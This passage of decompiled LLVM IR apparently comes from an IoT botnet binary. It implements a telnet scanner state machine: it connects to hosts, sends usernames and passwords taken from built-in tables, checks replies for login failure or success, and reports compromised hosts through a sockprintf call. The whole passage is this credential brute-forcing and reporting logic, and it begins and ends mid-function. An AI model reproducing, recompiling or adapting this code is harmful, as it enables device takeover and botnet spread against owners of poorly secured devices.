  br label %dec_label_pc_df5c

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d1ec, %dec_label_pc_d288
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d2e0 = call i32 @advance_state(i32* nonnull %v1_d1e0, i32 1)
  br label %dec_label_pc_df5c

dec_label_pc_d2fc.lr.ph:                          ; preds = %dec_label_pc_ce3c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d2fc

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d2fc.lr.ph, %dec_label_pc_d2fc
  %storemerge610 = phi i32 [ 0, %dec_label_pc_d2fc.lr.ph ], [ %v1_d310, %dec_label_pc_d2fc ]
  store i32 %v2_d2e8, i32* %r2.global-to-local, align 4
  %v5_d308 = mul nuw nsw i32 %storemerge610, 4
  %v6_d308 = add i32 %v5_d308, %v2_d2e8
  %v7_d308 = inttoptr i32 %v6_d308 to i32*
  store i32 0, i32* %v7_d308, align 4
  %v1_d310 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_d310, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_d310, 32
  br i1 %tmp43, label %dec_label_pc_d2fc, label %dec_label_pc_d324

dec_label_pc_d324:                                ; preds = %dec_label_pc_d2fc
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d33c = inttoptr i32 %v2_cdf0 to i32*
  %v2_d33c = load i32, i32* %v1_d33c, align 4
  %v3_d340 = udiv i32 %v2_d33c, 32
  %v3_d354 = mul nuw nsw i32 %v3_d340, 4
  %v2_d35c = add i32 %v3_d354, %v19_cba0
  store i32 %v2_d35c, i32* %r2.global-to-local, align 4
  %v2_d360 = add i32 %v2_d35c, -300
  store i32 %v2_d360, i32* %r3.global-to-local, align 4
  %v1_d364 = inttoptr i32 %v2_d360 to i32*
  %v2_d364 = load i32, i32* %v1_d364, align 4
  store i32 %v2_d364, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d380 = load i32, i32* %v1_d33c, align 4
  %v1_d384 = urem i32 %v2_d380, 32
  %v6_d38c = shl i32 1, %v1_d384
  %v2_d390 = or i32 %v6_d38c, %v2_d364
  store i32 %v2_d390, i32* %v1_d364, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d3d8 = load i32, i32* %v1_d33c, align 4
  %v1_d3dc = add i32 %v2_d3d8, 1
  store i32 %v1_d3dc, i32* %r2.global-to-local, align 4
  store i32 %v2_d2e8, i32* %ip.global-to-local, align 4
  %v1_d3e8 = load i32, i32* @sp, align 4
  %v2_d3e8 = inttoptr i32 %v1_d3e8 to i32*
  store i32 %v2_d3e4, i32* %v2_d3e8, align 4
  %v0_d3ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_d2e8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_d3fc = load i32, i32* %stack_var_-332, align 4
  %v5_d3fc = call i32 @__libc_select(i32 %v0_d3ec, i32 0, i32 %v2_d2e8, i32 0, i32 %v4_d3fc)
  store i32 %v5_d3fc, i32* %r3.global-to-local, align 4
  %v7_d40c = icmp eq i32 %v5_d3fc, 1
  br i1 %v7_d40c, label %dec_label_pc_d414, label %dec_label_pc_d518

dec_label_pc_d414:                                ; preds = %dec_label_pc_d324
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d43c = load i32, i32* %v1_d33c, align 4
  store i32 %v2_d43c, i32* %r2.global-to-local, align 4
  store i32 %v2_d440, i32* %ip.global-to-local, align 4
  %v1_d448 = load i32, i32* @sp, align 4
  %v2_d448 = inttoptr i32 %v1_d448 to i32*
  store i32 %v2_d444, i32* %v2_d448, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_d440, i32* %r3.global-to-local, align 4
  %v0_d45c = call i32 @getsockopt()
  %v3_d460 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_d460, i32* %r3.global-to-local, align 4
  %v2_d464 = icmp eq i32 %v3_d460, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  br i1 %v2_d464, label %dec_label_pc_d490, label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d414
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d488 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d490:                                ; preds = %dec_label_pc_d414
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d4a8 = load i32, i32* %v1_d33c, align 4
  store i32 %v2_d4a8, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d4c4 = load i32, i32* %v1_d33c, align 4
  store i32 %v2_d4c4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_d4d4 = call i32 @__libc_fcntl(i32 %v2_d4c4, i32 3)
  %v1_d4dc = and i32 %v2_d4d4, -2049
  store i32 %v1_d4dc, i32* %r3.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r4, align 4
  store i32 %v1_d4dc, i32* @r2, align 4
  %v2_d4ec = call i32 @__libc_fcntl(i32 %v0_d4e0, i32 4)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d510 = call i32 @advance_state(i32* nonnull %v1_d33c, i32 2)
  br label %dec_label_pc_df5c

dec_label_pc_d518:                                ; preds = %dec_label_pc_d324
  store i32 %v5_d3fc, i32* %r3.global-to-local, align 4
  %v3_d51c = icmp eq i32 %v5_d3fc, -1
  br i1 %v3_d51c, label %dec_label_pc_d524, label %dec_label_pc_d548

dec_label_pc_d524:                                ; preds = %dec_label_pc_d518
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d540 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d548:                                ; preds = %dec_label_pc_d518
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d564 = add i32 %v2_cdec, %v2_d560
  store i32 %v2_d564, i32* %r3.global-to-local, align 4
  %v1_d568 = inttoptr i32 %v2_d564 to i32*
  %v2_d568 = load i32, i32* %v1_d568, align 4
  store i32 %v2_d568, i32* %r3.global-to-local, align 4
  %v1_d56c = add i32 %v2_d568, 5
  store i32 %v1_d56c, i32* @r4, align 4
  %v2_d574 = call i32 @__GI_time(i32* null)
  store i32 %v2_d574, i32* %r3.global-to-local, align 4
  %v0_d57c = load i32, i32* @r4, align 4
  %v3_d57c = icmp ult i32 %v0_d57c, %v2_d574
  br i1 %v3_d57c, label %dec_label_pc_d584, label %dec_label_pc_df5c

dec_label_pc_d584:                                ; preds = %dec_label_pc_d548
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d5a0 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d5a8:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d5c0 = inttoptr i32 %v2_cdf0 to i32*
  %v2_d5c0 = load i32, i32* %v1_d5c0, align 4
  store i32 %v2_d5c0, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d5e0 = add i32 %v2_cdec, %v2_d5dc
  store i32 %v2_d5e0, i32* %r3.global-to-local, align 4
  %v1_d5e4 = inttoptr i32 %v2_d5e0 to i32*
  %v2_d5e4 = load i32, i32* %v1_d5e4, align 4
  store i32 %v2_d5e4, i32* %r2.global-to-local, align 4
  %v1_d5ec = load i32, i32* @sp, align 4
  %v2_d5ec = inttoptr i32 %v1_d5ec to i32*
  store i32 ptrtoint (i32* @global_var_2d1cc to i32), i32* %v2_d5ec, align 4
  %v0_d5f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_d5fc = inttoptr i32 %v2_d5e4 to i8*
  %v5_d5fc = call i32 @read_until_response(i32 %v0_d5f0, i32 %arg1, i8* %v4_d5fc, i32 1024)
  %v2_d604 = icmp eq i32 %v5_d5fc, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_d604, label %dec_label_pc_d694, label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d5a8
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d628 = add i32 %v2_cdf0, 24
  store i32 %v2_d628, i32* %r3.global-to-local, align 4
  %v1_d62c = inttoptr i32 %v2_d628 to i32*
  %v2_d62c = load i32, i32* %v1_d62c, align 4
  store i32 %v2_d62c, i32* %r3.global-to-local, align 4
  %v1_d634 = call i32 @contains_fail(i32 %v2_d62c)
  %v2_d63c = icmp eq i32 %v1_d634, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v2_d63c, label %dec_label_pc_d66c, label %dec_label_pc_d644

dec_label_pc_d644:                                ; preds = %dec_label_pc_d60c
  %v3_d664 = call i32 @advance_state(i32* %v1_d5c0, i32 0)
  br label %dec_label_pc_df5c

dec_label_pc_d66c:                                ; preds = %dec_label_pc_d60c
  %v3_d68c = call i32 @advance_state(i32* %v1_d5c0, i32 3)
  br label %dec_label_pc_df5c

dec_label_pc_d694:                                ; preds = %dec_label_pc_d5a8
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf4, i32* %r3.global-to-local, align 4
  %v2_d6b4 = load i32, i32* %v1_cdf8, align 4
  store i32 %v2_d6b4, i32* %r3.global-to-local, align 4
  %v1_d6b8 = add i32 %v2_d6b4, 7
  store i32 %v1_d6b8, i32* @r4, align 4
  %v2_d6c0 = call i32 @__GI_time(i32* null)
  store i32 %v2_d6c0, i32* %r3.global-to-local, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  %v3_d6c8 = icmp ult i32 %v0_d6c8, %v2_d6c0
  br i1 %v3_d6c8, label %dec_label_pc_d6d0, label %dec_label_pc_df5c

dec_label_pc_d6d0:                                ; preds = %dec_label_pc_d694
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d6ec = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d70c = inttoptr i32 %v2_cdf0 to i32*
  %v2_d70c = load i32, i32* %v1_d70c, align 4
  store i32 %v2_d70c, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d72c = add i32 %v2_cdf0, 8
  store i32 %v2_d72c, i32* %r3.global-to-local, align 4
  %v1_d730 = add i32 %v2_cdf0, 10
  %v2_d730 = inttoptr i32 %v1_d730 to i8*
  %v3_d730 = load i8, i8* %v2_d730, align 2
  %v4_d730 = zext i8 %v3_d730 to i32
  store i32 %v4_d730, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32), i32* %r3.global-to-local, align 4
  %v4_d73c = mul nuw nsw i32 %v4_d730, 4
  %v5_d73c = add i32 %v4_d73c, ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32)
  %v6_d73c = inttoptr i32 %v5_d73c to i32*
  %v7_d73c = load i32, i32* %v6_d73c, align 4
  store i32 %v7_d73c, i32* @r5, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_d72c, i32* %r3.global-to-local, align 4
  %v3_d760 = load i8, i8* %v2_d730, align 2
  %v4_d760 = zext i8 %v3_d760 to i32
  store i32 %v4_d760, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32), i32* %r3.global-to-local, align 4
  %v4_d76c = mul nuw nsw i32 %v4_d760, 4
  %v5_d76c = add i32 %v4_d76c, ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32)
  %v6_d76c = inttoptr i32 %v5_d76c to i32*
  %v7_d76c = load i32, i32* %v6_d76c, align 4
  store i32 %v7_d76c, i32* %r3.global-to-local, align 4
  %v1_d770 = inttoptr i32 %v7_d76c to i8*
  %v3_d774 = call i32 @strlen(i8* %v1_d770)
  %v0_d77c = load i32, i32* @r4, align 4
  %v0_d780 = load i32, i32* @r5, align 4
  store i32 %v3_d774, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_d78c = inttoptr i32 %v0_d780 to i32*
  %v5_d78c = call i32 @__libc_send(i32 %v0_d77c, i32* %v4_d78c, i32 %v3_d774, i32 16384)
  %v1_d794 = icmp slt i32 %v5_d78c, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_d794, label %dec_label_pc_d79c, label %dec_label_pc_d7c0

dec_label_pc_d79c:                                ; preds = %dec_label_pc_d6f4
  %v3_d7b8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d6f4
  %v2_d7d8 = load i32, i32* %v1_d70c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_d7ec = call i32 @__libc_send(i32 %v2_d7d8, i32* bitcast ([3 x i8]* @global_var_1b9ec.341 to i32*), i32 2, i32 16384)
  %v1_d7f4 = icmp slt i32 %v6_d7ec, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_d7f4, label %dec_label_pc_d7fc, label %dec_label_pc_d820

dec_label_pc_d7fc:                                ; preds = %dec_label_pc_d7c0
  %v3_d818 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d820:                                ; preds = %dec_label_pc_d7c0
  %v3_d840 = call i32 @advance_state(i32* nonnull %v1_d70c, i32 4)
  br label %dec_label_pc_df5c

dec_label_pc_d848:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d860 = inttoptr i32 %v2_cdf0 to i32*
  %v2_d860 = load i32, i32* %v1_d860, align 4
  store i32 %v2_d860, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d880 = add i32 %v2_cdec, %v2_d5dc
  store i32 %v2_d880, i32* %r3.global-to-local, align 4
  %v1_d884 = inttoptr i32 %v2_d880 to i32*
  %v2_d884 = load i32, i32* %v1_d884, align 4
  store i32 %v2_d884, i32* %r2.global-to-local, align 4
  %v1_d88c = load i32, i32* @sp, align 4
  %v2_d88c = inttoptr i32 %v1_d88c to i32*
  store i32 ptrtoint (i32* @global_var_2d1cc to i32), i32* %v2_d88c, align 4
  %v0_d890 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_d89c = inttoptr i32 %v2_d884 to i8*
  %v5_d89c = call i32 @read_until_response(i32 %v0_d890, i32 %arg1, i8* %v4_d89c, i32 1024)
  %v2_d8a4 = icmp eq i32 %v5_d89c, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_d8a4, label %dec_label_pc_d934, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %dec_label_pc_d848
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d8c8 = add i32 %v2_cdf0, 24
  store i32 %v2_d8c8, i32* %r3.global-to-local, align 4
  %v1_d8cc = inttoptr i32 %v2_d8c8 to i32*
  %v2_d8cc = load i32, i32* %v1_d8cc, align 4
  store i32 %v2_d8cc, i32* %r3.global-to-local, align 4
  %v1_d8d4 = call i32 @contains_fail(i32 %v2_d8cc)
  %v2_d8dc = icmp eq i32 %v1_d8d4, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v2_d8dc, label %dec_label_pc_d90c, label %dec_label_pc_d8e4

dec_label_pc_d8e4:                                ; preds = %dec_label_pc_d8ac
  %v3_d904 = call i32 @advance_state(i32* %v1_d860, i32 0)
  br label %dec_label_pc_df5c

dec_label_pc_d90c:                                ; preds = %dec_label_pc_d8ac
  %v3_d92c = call i32 @advance_state(i32* %v1_d860, i32 5)
  br label %dec_label_pc_df5c

dec_label_pc_d934:                                ; preds = %dec_label_pc_d848
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf4, i32* %r3.global-to-local, align 4
  %v2_d954 = load i32, i32* %v1_cdf8, align 4
  store i32 %v2_d954, i32* %r3.global-to-local, align 4
  %v1_d958 = add i32 %v2_d954, 3
  store i32 %v1_d958, i32* @r4, align 4
  %v2_d960 = call i32 @__GI_time(i32* null)
  store i32 %v2_d960, i32* %r3.global-to-local, align 4
  %v0_d968 = load i32, i32* @r4, align 4
  %v3_d968 = icmp ult i32 %v0_d968, %v2_d960
  br i1 %v3_d968, label %dec_label_pc_d970, label %dec_label_pc_df5c

dec_label_pc_d970:                                ; preds = %dec_label_pc_d934
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d98c = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d994:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d9ac = inttoptr i32 %v2_cdf0 to i32*
  %v2_d9ac = load i32, i32* %v1_d9ac, align 4
  store i32 %v2_d9ac, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d9cc = add i32 %v2_cdf0, 8
  store i32 %v2_d9cc, i32* %r3.global-to-local, align 4
  %v1_d9d0 = add i32 %v2_cdf0, 11
  %v2_d9d0 = inttoptr i32 %v1_d9d0 to i8*
  %v3_d9d0 = load i8, i8* %v2_d9d0, align 1
  %v4_d9d0 = zext i8 %v3_d9d0 to i32
  store i32 %v4_d9d0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32), i32* %r3.global-to-local, align 4
  %v4_d9dc = mul nuw nsw i32 %v4_d9d0, 4
  %v5_d9dc = add i32 %v4_d9dc, ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32)
  %v6_d9dc = inttoptr i32 %v5_d9dc to i32*
  %v7_d9dc = load i32, i32* %v6_d9dc, align 4
  store i32 %v7_d9dc, i32* @r5, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_d9cc, i32* %r3.global-to-local, align 4
  %v3_da00 = load i8, i8* %v2_d9d0, align 1
  %v4_da00 = zext i8 %v3_da00 to i32
  store i32 %v4_da00, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32), i32* %r3.global-to-local, align 4
  %v4_da0c = mul nuw nsw i32 %v4_da00, 4
  %v5_da0c = add i32 %v4_da0c, ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32)
  %v6_da0c = inttoptr i32 %v5_da0c to i32*
  %v7_da0c = load i32, i32* %v6_da0c, align 4
  store i32 %v7_da0c, i32* %r3.global-to-local, align 4
  %v1_da10 = inttoptr i32 %v7_da0c to i8*
  %v3_da14 = call i32 @strlen(i8* %v1_da10)
  %v0_da1c = load i32, i32* @r4, align 4
  %v0_da20 = load i32, i32* @r5, align 4
  store i32 %v3_da14, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_da2c = inttoptr i32 %v0_da20 to i32*
  %v5_da2c = call i32 @__libc_send(i32 %v0_da1c, i32* %v4_da2c, i32 %v3_da14, i32 16384)
  %v1_da34 = icmp slt i32 %v5_da2c, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_da34, label %dec_label_pc_da3c, label %dec_label_pc_da60

dec_label_pc_da3c:                                ; preds = %dec_label_pc_d994
  %v3_da58 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_da60:                                ; preds = %dec_label_pc_d994
  %v2_da78 = load i32, i32* %v1_d9ac, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_da8c = call i32 @__libc_send(i32 %v2_da78, i32* bitcast ([3 x i8]* @global_var_1b9ec.341 to i32*), i32 2, i32 16384)
  %v1_da94 = icmp slt i32 %v6_da8c, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_da94, label %dec_label_pc_da9c, label %dec_label_pc_dac0

dec_label_pc_da9c:                                ; preds = %dec_label_pc_da60
  %v3_dab8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_dac0:                                ; preds = %dec_label_pc_da60
  %v3_dae0 = call i32 @advance_state(i32* nonnull %v1_d9ac, i32 6)
  br label %dec_label_pc_df5c

dec_label_pc_dae8:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_db00 = inttoptr i32 %v2_cdf0 to i32*
  %v2_db00 = load i32, i32* %v1_db00, align 4
  store i32 %v2_db00, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_db20 = add i32 %v2_cdec, %v2_d5dc
  store i32 %v2_db20, i32* %r3.global-to-local, align 4
  %v1_db24 = inttoptr i32 %v2_db20 to i32*
  %v2_db24 = load i32, i32* %v1_db24, align 4
  store i32 %v2_db24, i32* %r2.global-to-local, align 4
  %v1_db2c = load i32, i32* @sp, align 4
  %v2_db2c = inttoptr i32 %v1_db2c to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2d210.345 to i32), i32* %v2_db2c, align 4
  %v0_db30 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_db3c = inttoptr i32 %v2_db24 to i8*
  %v5_db3c = call i32 @read_until_response(i32 %v0_db30, i32 %arg1, i8* %v4_db3c, i32 1024)
  store i32 %v5_db3c, i32* %r3.global-to-local, align 4
  %v2_db44 = icmp eq i32 %v5_db3c, 0
  br i1 %v2_db44, label %dec_label_pc_dd8c, label %dec_label_pc_db4c

dec_label_pc_db4c:                                ; preds = %dec_label_pc_dae8
  store i32 %storemerge553, i32* @r4, align 4
  %v2_db54 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_db68 = load i32, i32* @r4, align 4
  %v2_db74 = mul i32 %v0_db68, 28
  %v2_db7c = add i32 %v2_d560, %v2_db74
  %v2_db80 = inttoptr i32 %v2_db7c to i32*
  store i32 %v2_db54, i32* %v2_db80, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_db20, i32* %r3.global-to-local, align 4
  %v2_dba4 = load i32, i32* %v1_db24, align 4
  store i32 %v2_dba4, i32* %r3.global-to-local, align 4
  %v1_dbac = call i32 @contains_fail(i32 %v2_dba4)
  store i32 %v1_dbac, i32* %r3.global-to-local, align 4
  %v2_dbb4 = icmp eq i32 %v1_dbac, 0
  br i1 %v2_dbb4, label %dec_label_pc_dbe4, label %dec_label_pc_dbbc

dec_label_pc_dbbc:                                ; preds = %dec_label_pc_db4c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dbdc = call i32 @advance_state(i32* %v1_db00, i32 0)
  br label %dec_label_pc_df5c

dec_label_pc_dbe4:                                ; preds = %dec_label_pc_db4c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_db20, i32* %r3.global-to-local, align 4
  %v2_dc04 = load i32, i32* %v1_db24, align 4
  store i32 %v2_dc04, i32* %r3.global-to-local, align 4
  %v1_dc0c = call i32 @contains_success(i32 %v2_dc04)
  store i32 %v1_dc0c, i32* %r3.global-to-local, align 4
  %v2_dc14 = icmp eq i32 %v1_dc0c, 0
  br i1 %v2_dc14, label %dec_label_pc_dd3c, label %dec_label_pc_dc1c

dec_label_pc_dc1c:                                ; preds = %dec_label_pc_dbe4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_dc38 = add i32 %v2_cdf0, 8
  store i32 %v2_dc38, i32* %r3.global-to-local, align 4
  %v1_dc3c = add i32 %v2_cdf0, 9
  %v2_dc3c = inttoptr i32 %v1_dc3c to i8*
  %v3_dc3c = load i8, i8* %v2_dc3c, align 1
  %v4_dc3c = zext i8 %v3_dc3c to i32
  store i32 %v4_dc3c, i32* %r3.global-to-local, align 4
  %v7_dc40 = icmp eq i8 %v3_dc3c, 2
  br i1 %v7_dc40, label %dec_label_pc_dc48, label %dec_label_pc_dc70

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc1c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dc68 = call i32 @advance_state(i32* %v1_db00, i32 7)
  br label %dec_label_pc_df5c

dec_label_pc_dc70:                                ; preds = %dec_label_pc_dc1c
  %v2_dc74 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_dc74, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dc94 = call i32 @get_telstate_host(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  store i32 %v3_dc94, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_dc38, i32* %r3.global-to-local, align 4
  %v1_dcbc = add i32 %v2_cdf0, 10
  %v2_dcbc = inttoptr i32 %v1_dcbc to i8*
  %v3_dcbc = load i8, i8* %v2_dcbc, align 2
  %v4_dcbc = zext i8 %v3_dcbc to i32
  store i32 %v4_dcbc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32), i32* %r3.global-to-local, align 4
  %v4_dcc8 = mul nuw nsw i32 %v4_dcbc, 4
  %v5_dcc8 = add i32 %v4_dcc8, ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32)
  %v6_dcc8 = inttoptr i32 %v5_dcc8 to i32*
  %v7_dcc8 = load i32, i32* %v6_dcc8, align 4
  store i32 %v7_dcc8, i32* @lr, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_dc38, i32* %r3.global-to-local, align 4
  %v1_dcec = add i32 %v2_cdf0, 11
  %v2_dcec = inttoptr i32 %v1_dcec to i8*
  %v3_dcec = load i8, i8* %v2_dcec, align 1
  %v4_dcec = zext i8 %v3_dcec to i32
  store i32 %v4_dcec, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32), i32* %r3.global-to-local, align 4
  %v4_dcf8 = mul nuw nsw i32 %v4_dcec, 4
  %v5_dcf8 = add i32 %v4_dcf8, ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32)
  %v6_dcf8 = inttoptr i32 %v5_dcf8 to i32*
  %v7_dcf8 = load i32, i32* %v6_dcf8, align 4
  %v1_dcfc = load i32, i32* @sp, align 4
  %v2_dcfc = inttoptr i32 %v1_dcfc to i32*
  store i32 %v7_dcf8, i32* %v2_dcfc, align 4
  %v0_dd00 = load i32, i32* @r4, align 4
  %v0_dd08 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_dd08, i32* @r2, align 4
  %v0_dd0c = load i32, i32* @lr, align 4
  store i32 %v0_dd0c, i32* %r3.global-to-local, align 4
  %v3_dd10 = call i32 @sockprintf(i32 %v0_dd00, i32 ptrtoint ([23 x i8]* @global_var_1b9f0.348 to i32))
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dd34 = call i32 @advance_state(i32* %v1_db00, i32 7)
